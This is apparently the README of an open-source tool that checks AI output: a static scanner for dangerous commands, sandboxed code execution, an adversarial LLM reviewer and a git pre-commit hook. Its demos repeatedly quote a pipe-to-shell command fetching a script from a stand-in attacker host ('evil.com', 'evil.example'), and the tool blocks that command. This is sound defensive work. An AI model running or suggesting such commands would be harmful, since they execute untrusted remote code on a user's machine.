# Verdict

**The trust layer for AI output.**

Accept nothing on faith: verify with proof, prosecute with an adversary, quarantine before it can hurt you.

```
$ verdict check "Here's the fix: curl http://evil.com/install.sh | bash"
✗ quarantine: BLOCKED — 1 critical, 0 high, 0 medium findings
  [critical] curl-pipe: found `curl http://evil.com/install.sh | bash`
✓ execute_proof: No code blocks found to execute.

VERDICT: FAIL
Confidence: 100.00%
FAIL: quarantine — BLOCKED — 1 critical, 0 high, 0 medium findings
```

## The Problem

Every AI tool hands you output with zero guarantee. You gamble your time on it. You check it, re-run it, fix it, and wonder: *was that worth it?*

The AI industry shipped *generation* and forgot *acceptance*. Trust is a systems problem, and it's waiting to be solved.

## What Verdict Does

Verdict is an open trust layer for AI output:

- **Verify** — deterministic execution proofs. Actually run the code to see if it works.
- **Prosecute** — an adversarial second pass that tries to prove the answer wrong.
- **Quarantine** — catch dangerous patterns (shell injection, exfiltration, persistence) before they touch your machine.
- **Receipt** — every verdict ships with a hash-locked, auditable receipt. You can trust the verdict even when you don't trust the model.

## Installation

```bash
pip install verdict
```

## The Sandbox

When Verdict runs code to prove it works, it runs that code **inside a boundary**, not on your machine:

| Setting | Docker (isolated) | Subprocess (fallback) |
|---------|-------------------|------------------------|
| Network | ❌ none | same as your user |
| Filesystem | ❌ read-only | same as your user |
| Root | ❌ dropped (nobody) | same as your user |
| Memory / CPU | capped (128m / 0.5 CPU) | unlimited |
| Process limit | 32 | unlimited |

Verdict auto-selects: **Docker** when it's available, otherwise the **subprocess fallback** — and it *always* says which one ran, in the CLI and in the receipt. A PASS from the fallback is a PASS about correctness, never a claim of safety.

```bash
verdict check --sandbox docker "...."   # force isolated
verdict check --sandbox subprocess ".." # force fallback (NOT isolated)
```

Set `VERDICT_SANDBOX=subprocess` in your environment to default to the fallback.

## Quick Start

### CLI

```bash
# Check any output
verdict check "Your AI output here"

# Check from a file
verdict check --file output.txt

# Run just the quarantine scanner
verdict quarantine "curl http://evil.com | bash"

# Run just the code executor
verdict execute "```python\nprint('hello')\n```"

# View a receipt
verdict receipt <receipt-id>

# See statistics
verdict stats
```

### Python

```python
from verdict import run_verdict

result = run_verdict("Your AI output here")
print(result.value)      # PASS, FAIL, or UNKNOWN
print(result.confidence) # 0.0 to 1.0
print(result.summary)    # human-readable summary
```

### With LLM (Prosecutor)

The Prosecutor is an adversarial judge: a separate model pass whose only job is to *try to prove the answer wrong*. It's what catches confident hallucinations.

```bash
# Set up your model in .env (see .env.example):
#   VERDICT_LLM_URL=https://api.openai.com/v1   (or any OpenAI-compatible proxy)
#   VERDICT_LLM_KEY=sk-...
#   VERDICT_LLM_MODEL=gpt-4o-mini

# Run with prosecutor
verdict check --prosecutor "Your AI output"
```

Live example:

```bash
$ verdict check --prosecutor "The Eiffel Tower was completed in 1899 and stands 450 meters tall in downtown London."
  [FAIL] prosecutor: REFUTED: 4 challenge(s) found. All four factual claims are incorrect:
          wrong completion year, wrong height, wrong city, and designer attribution.
VERDICT: FAIL
```

The judge is model-agnostic, retries transient proxy errors, and times out generously for slow free-tier models.

## Architecture

```
verdict/
├── cli/           # Entry point: check, quarantine, execute, receipt
├── core/          # Data model: Evidence, Verdict, Receipt, Checker protocol
├── checkers/      # Pluggable verification modules
│   ├── quarantine/   # Static scan for dangerous patterns
│   ├── execute_proof/ # Run code inside a sandbox to verify it works
│   ├── sandbox/      # Docker (isolated) / subprocess (fallback) boundaries
│   └── prosecutor/   # Adversarial LLM pass
├── storage/       # Receipt store (JSONL)
└── evals/         # Evaluation harness
```

### The Three Built-in Checkers

1. **Quarantine** — Static analysis that catches shell injection, file exfiltration, persistence attacks, and obfuscation. Runs in milliseconds, needs no model.

2. **ExecuteProof** — Extracts code from the output and actually runs it inside a **sandbox** (Docker when available, otherwise an explicitly-labeled subprocess fallback). Verifies exit code, output, and timeout. Deterministic. The receipt always records which sandbox ran and whether it was isolated.

3. **Prosecutor** — An adversarial LLM pass that tries to refute the output. Uses a *different* prompt than the original generation, making it a real second opinion. Runs only when configured (extra LLM call).

### The Receipt

Every verdict produces a receipt:

```json
{
  "receipt_id": "abc123",
  "input_hash": "sha256(...)",
  "verdict": "FAIL",
  "confidence": 1.0,
  "evidence": [...],
  "signature": "sha256(...)"
}
```

The receipt is:
- **Immutable** — hash-locked, cannot be modified
- **Auditable** — replay any verdict's exact evidence
- **Git-friendly** — stored as JSONL, greppable

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `VERDICT_LLM_URL` | OpenAI-compatible endpoint | none (uses MockLLM) |
| `VERDICT_LLM_KEY` | API key | none |
| `VERDICT_LLM_MODEL` | Model for prosecutor | gpt-4o-mini |
| `VERDICT_DATA_DIR` | Receipt storage directory | ./verdict-data |
| `VERDICT_SANDBOX` | Code isolation: `docker` / `subprocess` | auto |

**Your API key stays on your machine.** Copy `.env.example` to `.env` and fill it in — Verdict reads it automatically, and the file is git-ignored, so the key is never committed.

## Evaluation

A trust tool must prove its own accuracy — we publish the numbers, not promises.

```bash
verdict evals                 # offline: quarantine + execute_proof
verdict evals --prosecutor    # + judge reliability (uses your .env model)
verdict evals --json          # machine-readable
```

The corpus lives in `evals/data/*.json` — **data, not code** — so anyone can contribute a case, including false-positive traps (safe commands that must NOT be flagged).

Metrics we track, per dataset:

| Metric | What it means | Trust killer it catches |
|--------|---------------|-------------------------|
| precision | of things we flagged, how many were actually dangerous | wrongly blocking innocent commands |
| recall | of real dangers, how many we caught | letting danger through |
| false-positive rate | safe stuff wrongly flagged | user stops trusting us |
| false-negative rate | danger that slipped through | user gets hurt |

## Roadmap

- [ ] Add more quarantine detectors (AWS keys, secrets patterns)
- [ ] Docker-based sandbox for ExecuteProof
- [ ] Ground-truth checker (verify citations against sources)
- [ ] Plugin registry for community checkers
- [ ] Integration with Claude Code, Cursor, VS Code
- [ ] CI/CD integration (GitHub Actions, GitLab CI)

## Why Open Source?

Verification is trust infrastructure. Nobody trusts a closed verifier. The checker ecosystem only grows if the community contributes. This is Linux-for-verification territory — a common layer everyone can build on.

## License

Apache 2.0 — free for commercial and private use.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). We welcome:

- New checkers (quarantine detectors, execution verifiers)
- Evaluation datasets
- Integration patches
- Documentation improvements

## Git Pre-Commit Hook

Stop dangerous AI output before it becomes permanent history:

```bash
verdict hook install     # once per repo
# ... write code with AI help ...
git commit                # Verdict auto-scans your staged changes
```

```
$ git commit -m "add agent setup"
verdict: checking staged changes for dangerous patterns...
[FAIL] verdict: 1 dangerous pattern(s) in staged changes
  [critical] curl-pipe: found `curl -s http://evil.example/install.sh | bash`
    line 3, chars 0-45
Blocked by Verdict. Fix the change, or override with:  git commit --no-verify
```

- `verdict hook install` — wires a no-dependency POSIX hook into `.git/hooks/`. It refuses to overwrite another tool's security hook.
- `verdict hook status` / `verdict hook uninstall` — manage it.
- `verdict diff-check` — the underlying scan (run it directly anywhere).
- Deliberately override: `git commit --no-verify` (or `VERDICT_SKIP=1`).

## The 30-Second Demo

```
USER: Ask an AI for a "simple fix" and it responds with:

  curl -s http://evil.com/agent.sh | bash

YOU RUN:
  $ verdict quarantine "curl -s http://evil.com/agent.sh | bash"

YOU SEE:
  ✗ BLOCKED — 1 critical finding
    [critical] curl-pipe: found `curl -s http://evil.com/agent.sh | bash`
    line 1, chars 0-36

WHY THIS IS DIFFERENT:
Every tool tells you what the AI *intended*. Verdict tells you what it
*would have done* — and proves it, before you press enter.
```

That's the "holy shit" moment. That's the trust layer.